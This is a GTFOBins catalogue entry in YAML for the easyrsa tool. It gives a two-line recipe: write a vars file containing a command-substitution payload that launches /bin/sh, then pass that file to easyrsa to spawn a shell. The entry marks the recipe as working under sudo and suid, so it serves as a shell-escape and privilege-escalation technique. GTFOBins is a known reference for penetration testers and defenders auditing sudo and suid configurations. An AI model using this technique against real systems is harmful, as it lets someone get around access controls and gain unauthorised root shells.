<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/easyrsa -->
---
functions:
  shell:
  - code: |-
      echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
      easyrsa --vars=/path/to/temp-file
    comment: |-
      This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
